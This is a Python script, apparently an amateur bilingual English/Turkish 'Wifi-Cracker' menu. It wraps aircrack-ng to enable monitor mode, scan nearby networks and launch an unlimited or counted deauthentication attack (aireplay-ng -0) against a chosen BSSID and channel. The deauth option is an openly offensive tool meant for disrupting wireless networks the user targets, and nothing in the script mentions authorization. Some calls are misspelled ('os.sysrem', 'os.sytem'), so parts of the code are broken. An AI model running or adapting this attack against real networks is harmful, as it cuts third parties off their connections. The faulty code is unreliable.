import os
import subprocess
from subprocess import check_call
seçenek1 = "(1) English"
seçenek2 = "(2) Türkçe"
print(f"\n{seçenek1}")
print(f"\n{seçenek2}")
soru = int(input("Choose language (Dİl seçin): "))

if soru == 1:
    print("\nInstalling Needed Tools")
    print("\n")
    cmd0 = os.system("apt-get install aircrack-ng xterm")
    cmd = os.system("sleep 3 && clear")
    def intro():
        cmd = os.system("clear")
        print("""\033[1;32m
---------------------------------------------------------------------------------------
██╗    ██╗██╗███████╗██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██║    ██║██║██╔════╝██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║ █╗ ██║██║█████╗  ██║█████╗██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
██║███╗██║██║██╔══╝  ██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚███╔███╔╝██║██║     ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
---------------------------------------------------------------------------------------
(1)Start monitor mode
(2)Stop monitor mode
(3)Scan networks
(4)Deauth attack
(5)Donate
(00)Exit
-----------------------------------------------------------------------
""")
    intro()
    print("\nEnter your choise here : !#")
    var = int(input(""))
    if var == 1:
        print("\nEnter the interface:(Default(wlan0/wlan1))")
        interface = input("")
        order = "airmon-ng start {} && airmon-ng check kill".format(interface)
        geny = os.system(order)
        intro()
    elif var == 2:
        print("\nEnter the interface:(Default(wlan0mon/wlan1mon))")
        interface = input("")
        order = "airmon-ng stop {} && service network-manager restart".format(interface)
        geny = os.sysrem(order)
        intro()
    elif var == 3:
        print("\nEnter the interface:(Default >>(wlan0mon/wlan1mon))")
        interface = input("")
        order = "airodump-ng {} ".format(interface)
        print("When Done Press CTRL+c")
        cmd = os.system("sleep 3")
        geny = os.system(order)
        cmd = os.system("sleep 10")
        intro()
    elif var == 4:
        print("\nEnter the interface:(Default >>(wlan0mon/wlan1mon))")
        interface = input("")
        order = "airodump-ng {} ".format(interface)
        print("\nWhen Done Press CTRL+c")
        print("\nDon't Attack The Network if its Data is ZERO (you waste your time)")
        cmd = os.system("sleep 7")
        geny = os.system(order)
        print("\nEnter the bssid of the target?")
        bssid = str(input(""))
        print("\nEnter the channel of the network?")
        channel = int(input(""))
        print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
        print("the number of the packets Depends on the Distance Between you and the network")
        dist = int(input(""))
        order = "airodump-ng {} --bssid {} -c {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,dist,bssid,interface)
        geny = os.system(order)
        intro()
    elif var == 5:
        pass
    elif var == 00:
        exit()

if soru == 2:
    print("\nGerekli tool indiriliyor...")
    print("\n")
    cmd0 = os.system("apt-get install aircrack-ng xterm")
    cmd = os.system("sleep 3 && clear")
    def intro1():
        cmd = os.system("clear")
        print("""\033[1;32m
---------------------------------------------------------------------------------------
██╗    ██╗██╗███████╗██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██║    ██║██║██╔════╝██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║ █╗ ██║██║█████╗  ██║█████╗██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
██║███╗██║██║██╔══╝  ██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚███╔███╔╝██║██║     ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═
---------------------------------------------------------------------------------------
(1)Monitor modu başlat
(2)Monitor modu kapat
(3)Ağları tara
(4)Ağdan koparma
(5)Bağış
(00)Çıkış
""")
    intro1()
    print("\nYapmak istediğiniz işlemin numarası : !# ")
    var = int(input(""))
    if var == 1:
            print("\nAğ arayüzünü giriniz:(Varsayılan(wlan0/wlan1))")
            interface = input("")
            order = "airmon-ng start {} && airmon-ng check kill".format(interface)
            geny = os.system(order)
            intro1()
    elif var == 2:
            print("\nAğ arayüzünü giriniz:(Varsayılan(wlan0mon/wlan1mon))")
            interface = input("")
            order = "airmon-ng stop {} && service network-manager restart".format(interface)
            geny = os.system(order)
            intro1
    elif var == 3:
            print("\nAğ arayüzünü giriniz:(Varsayılan >> (wlan0mon/wlan1mon))")
            interface = input("")
            order = "airodump-ng {}".format(interface)
            print("\nTamamlanığında CTRL+c basın")
            cmd = os.system("sleep 3")
            geny = os.system(order)
            cmd = os.sytem("sleep 10")
            intro1()
    elif var == 4:
            print("\nAğ arayüzünü giriniz:(Varsayılan >>(wlan0mon/wlan1mon))")
            interface = input("")
            order = "airodump-ng {}".format(interface)
            print("\nTamamlandığında CTRL+c basın")
            print("Verisi sıfır olan ağlara atak yapmayın(Zaman kaybı)")
            cmd = os.system("sleep 7")
            geny = os.system(order)
            print("\nHedef ağın bssid'si?")
            bssid = str(input(""))
            print("Ağın yayın yaptığı kanal?")
            channel = int(input(""))
            print("\nAğa atak yapmak istediğiniz paket sayısı [1-10000] ( 0 sınırsız numara)")
            print("Paket sayısı sizinle ağ arasındaki mesafeye bağlı")
            dist = int(input(""))
            order = "airodump-ng {} --bssid {} -c {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,dist,bssid,interface)
            geny = os.system(order)
            intro1()
    elif var == 5:
            pass
    elif var == 00:
            exit()